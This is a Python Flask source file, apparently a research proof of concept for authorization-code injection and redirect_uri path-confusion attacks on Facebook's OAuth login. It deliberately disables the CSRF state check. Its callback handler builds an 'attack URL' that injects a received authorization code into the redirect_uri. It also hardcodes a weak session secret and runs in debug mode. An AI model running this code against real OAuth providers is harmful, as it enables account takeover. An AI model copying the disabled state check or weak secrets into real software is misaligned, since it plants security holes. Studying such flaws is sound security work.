from flask import Flask, Response, request, make_response, redirect, render_template, jsonify
from flask import session as login_session
from flask_cors import CORS

from urllib.parse import urlparse, urlunparse
import requests
import random
import string
import json

app = Flask(__name__)
CORS(app)

DO_NOT_CHECK_STATE = True

ngrok = 'https://4406-2-37-67-76.ngrok.io'
authorization_base_url = 'https://www.facebook.com/v16.0/dialog/oauth'
token_url = 'https://graph.facebook.com/v16.0/oauth/access_token'
request_url = 'https://graph.facebook.com/v16.0/me'
redirect_uri = f'{ngrok}/login/oauth/authorize'

client_id = '937387930629121'
client_secret = 'REDACTED'
scope = 'email'
inject_code = '1234567890'

# Login page
@app.route('/', methods=['GET'])
def show_login():
    """
    Show the login page and create the random state parameter.
    If the user is authenticated, redirect to the main page.
    """
    print(f'show_login(), session: {login_session}')
    if 'access_token' in login_session:
        return redirect('/index')
    state = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(32))
    login_session['state'] = state
    #return jsonify(state=state)
    return render_template('login.html', state=state, provider='Facebook')

# 1. Send initial request to get permissions from the user
@app.route('/handleLogin', methods=["GET"])
def handleLogin():
    '''
    Make the first request to get authorization from the user.
    '''
    # Check if there's a passed callback URL
    if 'callback' in request.args:
        if request.args.get('callback').startswith('/'):
            _redirect_uri = redirect_uri + request.args.get('callback')[1:]
        else:
            _redirect_uri = redirect_uri + request.args.get('callback')
    else:
        _redirect_uri = redirect_uri

    # Check that the state parameter is valid
    if DO_NOT_CHECK_STATE or login_session['state'] == request.args.get('state'):
        # Get the authorization code
        url = f'{authorization_base_url}?client_id={client_id}&state={login_session["state"]}' + \
            f'&scope={scope}' + \
            f'&response_type=code' + \
            f'&redirect_uri={_redirect_uri}'
        return redirect(url)
    else:
        return jsonify(invalid_state_token="invalid_state_token")

# 1. Redeem tests: send authorization request
@app.route('/authorize', methods=["GET"])
def authorize():
    '''
    Make the first request to get authorization from the user.
    '''
    if 'test' in request.args:
        test = request.args.get('test')
    else:
        test = 'genuine'

    _redirect_uri = ''
    if test == 'genuine':
        _redirect_uri = f'{redirect_uri}'

    elif test == 'code_injection':
        _redirect_uri = f'{redirect_uri}%3Fcode%3D{inject_code}'

    elif test == 'code_injection_path_confusion':
        _redirect_uri = f'{redirect_uri}/FAKEPATH'

    # Get the authorization code
    url = f'{authorization_base_url}?client_id={client_id}&state={login_session["state"]}' + \
        f'&response_type=code' + \
        f'&scope={scope}' + \
        f'&redirect_uri={_redirect_uri}'
    return redirect(url)

# /login/oauth/authorize
#2. Using the /callback route to handle authentication
@app.route('/login/oauth/authorize', methods=['GET', 'POST'])
def handle_callback_login():
    if DO_NOT_CHECK_STATE or login_session['state'] == request.args.get('state'):
        if 'state' not in login_session:
            return render_template(
                'attack.html', attack_URL='',
                provider='Facebook',
                code=request.args.get('code'),
                state=request.args.get('state')
            )
        if 'code' in request.args:
            # Create an attack URL to redirect the user to by injecting the received code into the redirect_URI
            _redirect_uri = f'{redirect_uri}%3Fcode%3D{request.args.get("code")}'
            url = f'{authorization_base_url}?client_id={client_id}&state={login_session["state"]}' + \
                f'&response_type=code' + \
                f'&scope={scope}' + \
                f'&redirect_uri={_redirect_uri}'
            return render_template(
                'attack.html', attack_URL=url,
                provider='Facebook',
                code=request.args.get('code'),
                state=request.args.get('state')
            )
        else:
            return jsonify(error="404_no_code"), 404
    else:
        return jsonify(invalid_state_token="invalid_state_token")

@app.route('/redeem', methods=['GET'])
def redeem():
    '''
    Redeem the authorization code for an access token.
    '''
    if 'code' in request.args:
        if 'test' in request.args:
            test = request.args.get('test')
        else:
            test = 'genuine'

        _redirect_uri = ''
        if test == 'genuine':
            _redirect_uri = f'{redirect_uri}'

        elif test == 'code_injection':
            _redirect_uri = f'{redirect_uri}%3Fcode%3D{inject_code}'

        elif test == 'code_injection_path_confusion':
            _redirect_uri = f'{redirect_uri}/FAKEPATH'

        # Redeem the authorization code for an access token
        url = f'{token_url}?' + \
                f'client_id={client_id}&client_secret={client_secret}' + \
                f'&code={request.args.get("code")}' + \
                f'&redirect_uri={_redirect_uri}' + \
                f'&grant_type=authorization_code'
        r = requests.get(url)

        print(f'redeem: {url}')

        try:
            return jsonify(r.json())
        except AttributeError:
            app.logger.debug('error redeeming the code')
            return jsonify(response=r.text), 500
    else:
        return jsonify(error="404_no_code"), 404

# 3. Get user information from GitHub 
@app.route('/index')
def index():
    print(f'index, session: {login_session}')
    # Check for access_token in session
    if 'access_token' not in login_session:
        return 'You are not authenticated', 404

    # Retrieve user information from the API
    url = request_url
    r = requests.get(url,
        params={
            'access_token': login_session['access_token'],
            'client_id': client_id,
            'client_secret': client_secret,
            'redirect_uri': redirect_uri
        })
    try:
        response = r.json()
        return jsonify(response=response)

    except AttributeError:
        app.logger.debug('error getting the information')
        return "Error retrieving the information", 500

@app.errorhandler(404)
def page_not_found(e):
    return jsonify(request.args), 404
    # if 'error' in request.args and 'redirect_uri_mismatch' in request.args.get('error'):
    #     return jsonify(request.args)
    # else:

if __name__ == '__main__':
    app.secret_key = 'super_secret_key'
    app.run(debug=True, port=8081)
